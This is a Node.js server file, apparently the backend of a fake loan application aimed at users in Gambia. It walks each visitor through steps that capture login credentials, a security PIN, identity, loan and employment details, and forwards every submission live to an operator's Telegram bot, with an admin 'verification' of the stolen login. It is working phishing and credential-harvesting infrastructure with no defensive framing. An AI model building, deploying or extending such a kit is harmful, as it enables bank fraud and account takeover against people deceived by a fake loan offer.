require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render with aggressive resource pooling
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Expose socket instance safely into callback query environments

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Global processes catch-all protection layer to keep Render online
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception thrown:', err.message);
});

// Webhook Route for Telegram
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    try {
        botManager.bot.processUpdate(req.body);
    } catch (err) {
        console.error("Webhook processing error:", err.message);
    }
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate a unique AppID for the session
    const appId = `GMB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    socket.join(appId);
    
    console.log(`🔌 Gambia User connected: ${appId}`);
    socket.emit('session-ready', { appId: appId });

    // Step 1: Login Credentials (Frontend Step 1 -> Triggers Admin Verification)
    socket.on('step4', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 1: Login Credentials", data, true);
    });

    // Step 2: Security PIN Submission (Frontend Step 2 -> Triggers Final PIN Verification)
    socket.on('step5', (data) => {
        if (data && data.pin) {
            botManager.sendFinalApproval(appId, data.pin);
        }
    });

    // Step 3: Loan Details (Frontend Step 3 -> Notification Only)
    socket.on('step1', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 3: Loan Details", data, false);
    });

    // Step 4: Identity Verification (Frontend Step 4 -> Notification Only)
    socket.on('step2', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 4: Identity Verification", data, false);
    });

    // Step 5: Employment Information (Frontend Step 5 -> Final Submission Notification)
    socket.on('step3', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 5: Employment Info", data, false);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected: ${appId}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Gambia Loan Server running on port ${PORT}`);
    
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Error:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL not found in environment settings. Using long polling fallbacks if configured.');
    }
});